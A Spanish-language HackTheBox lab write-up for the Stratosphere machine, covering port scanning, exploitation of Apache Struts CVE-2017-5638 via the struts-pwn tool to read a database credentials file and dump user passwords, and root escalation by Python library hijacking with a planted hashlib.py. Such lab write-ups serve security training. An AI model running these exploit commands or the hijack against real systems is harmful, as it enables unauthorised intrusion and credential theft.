---
title: HTB - Stratosphere
published: true
categories: [Linux]
tags: [eJPT, eWPT, Media]
---


<img src="/assets/HTB/Stratosphere/stratosphere.png">


¡Hola!
Vamos a resolver de la máquina `Stratosphere` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Apache Struts Exploitation (CVE-2017-5638)**
- **Python Library Hijacking (Privilege Escalation)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Stratosphere`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.64
PING 10.10.10.64 (10.10.10.64) 56(84) bytes of data.
64 bytes from 10.10.10.64: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.10.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.64 -oG allPorts

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80,8080 10.10.10.64 -oN targeted

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class= ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|_    Connection: close
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/ 1708-1519762495000
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class= ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Date: Sun, 11 Dec 2022 09:14:32 GMT
|_    Connection: close
|_http-title: Stratosphere
```


### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.10.64
http://10.10.10.64 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
❯ whatweb http://10.10.10.64:8080
http://10.10.10.64:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
```

Accedemos al servicio web por el puerto 80 y 8080 y en ambos casos observamos la misma página web

<img src="/assets/HTB/Stratosphere/web.png">

Inicialmente no tiene funcionalidad alguna por lo que procedemos a aplicar fuzzing

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.64:8080/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.64:8080/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000004875:   302        0 L      0 W        0 Ch        "manager"                                                                                                                   
000013276:   302        0 L      0 W        0 Ch        "Monitoring"
```

Por el puerto 80 únicamente encontramos algunos directorios relacionados con Apache, sin embargo, por el puerto 8080 encontramos un directorio `Monitoring`

<img src="/assets/HTB/Stratosphere/monitoring.png">

Observando la url vemos `Welcome.action`. Por la carpeta manager sabemos que estamos ante Apache. Buscamos en google la extensión `.action` y vemos que se trata de `Struts`. Struts es un framework para construir aplicaciones web Java basadas en la filosofía MVC. Buscando vulnerabilidades asociadas a este servicio encontramos este repositorio de GitHub de [mazen160](https://github.com/mazen160/struts-pwn). Nos lo clonamos en nuestro directorio de trabajo. Testeamos que funcione correctamente como nos indican en el repositorio

```bash
❯ python3 struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'id'

[*] URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

[%] Done.
```

A pesar de que tenemos capacidad de RCE las reglas de firewall implementadas no nos permiten entablar una reverse shell. Listamos contenido del directorio actual y vemos un archivo `db_connect`. Listamos su contenido y localizamos unas credenciales de mysql

```bash
❯ python3 struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'cat db_connect'

[*] URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
[*] CMD: cat db_connect
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

[%] Done.
```

Examinando el contenido de mysql encontramos la base de datos `users` y tabla `accounts`. Si listamos su contenido obtenemos las credenciales del usuario `richard`

```bash
❯ python3 struts-pwn.py --url 'http://10.10.10.64:8080/Monitoring/example/Welcome.action' -c 'mysql -uadmin -padmin -e "use users; select * from accounts"'

[*] URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
[*] CMD: mysql -uadmin -padmin -e "use users; select * from accounts"
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

fullName	password	username
Richard F. Smith	9tc*rhKuG5TyXvUJOrE^5CK7k	richard

[%] Done.
```

Nos conectamos por `ssh` y localizamos la flag de usuario en el directorio personal de `richard`

```bash
richard@stratosphere:~$ ls
Desktop  test.py  user.txt
richard@stratosphere:~$ cat user.txt 
b3ad9de45aae26214***************
```

### Escalada Privilegios

* * *

Enumerando privilegios de sudo encontramos que tenemos capacidad de ejecución como root del script `test.py`

```bash
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

Obsevando el script vemos que importa la librería `hashlib`. Si creamos un `hashlib.py` en el mismo directorio donde nos econtramos, python importará este módulo en lugar del `haslib` real y ejecutará su contenido

```bash
richard@stratosphere:~$ ls
Desktop  hashlib.py  test.py  user.txt
richard@stratosphere:~$ cat hashlib.py 
import pty

pty.spawn("/bin/bash")
richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py
root@stratosphere:/home/richard# whoami
root
root@stratosphere:/home/richard# cat /root/root.txt 
71d521e4d677bd3ac***************
```

Hemos completado la máquina **Stratosphere** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/Stratosphere/pwned.png">